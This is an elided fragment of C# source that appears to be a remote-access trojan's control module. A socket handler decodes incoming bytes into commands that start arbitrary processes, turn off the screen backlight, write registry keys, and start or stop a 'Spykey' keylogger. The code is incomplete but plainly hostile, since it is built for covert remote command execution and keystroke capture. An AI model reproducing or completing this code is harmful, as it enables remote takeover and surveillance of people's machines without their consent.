...
namespace S2_0
{
    class classControl
    {
        ...
        public classControl(Form1 form1, Socket socket, object SocketClientPara)
        {
            this.form1 = form1;
            clientSocket = socket;
            contextIndex = (int)SocketClientPara;
        ...
        //public void passStream(byte[] stream)
        ...
        public void passStream(IAsyncResult ar)
        {
            Socket socket = null;
            int length = 0;
            try
            ...
            {
                form1.terminateThread(contextIndex);
                LogBuilder.buildLog("passStream error at: " + contextIndex + "\r\n" + e.Message);
            }
            ...
            if(length == 0)
            {
                ...
                LogBuilder.buildLog("Socket at : " + contextIndex + "had lost!");
            }

            int length_bytes = StreamBuffer.Length;
            byte[] stream = StreamBuffer;

            if (getHead(StreamBuffer, 0) > 0 && getHead(StreamBuffer, 1) > 0)//take care our becontrol list///////////////////////////////////////////////////////////////////////////////////////////////////
            {
                switch (getHead(StreamBuffer, 0))
                {
                    case 1://CMD Comand
                        try
                        {
                            ...
                            LogBuilder.buildLog("Start a Process: " + str);
                        }
                        catch (Exception e)
                        {
                            LogBuilder.buildLog("CMD Comand Error: " + e.Message);
                            //MessageBox.Show(e.Message);
                        }
            ...
            try
            {
                LogBuilder.buildLog("loop: " + loopCount);
            ...
            catch (Exception e)
            {
                ...
                LogBuilder.buildLog("BeginReceive Inside: " + e.Message);
            }

            
        }

        private void beControl(byte[] commands)
        {
            ...
            switch (commands[2])//system opreation
            {
                ...
                case 0x20://turn off back ligt
                    SendMessage(form1.Handle, (uint)0x0112, (IntPtr)0xF170, (IntPtr)2);//Turn off backlight
            ...
            switch (commands[4])//register operation
            {
                case 0x10:

                    try
                    {
                        form1.setReg("keySer", "1");
                    }
                    catch (Exception ex)
                    {
                        //MessageBox.Show(ex.Message);
            ...
            switch (commands[7])//System hook
            {
                ...
                case 0x41://Spykey buile log
                    form1.keyspy.buildLog();

                    break;

                case 0x42://Stop Spykey
                    form1.keyspy.stopSpy();
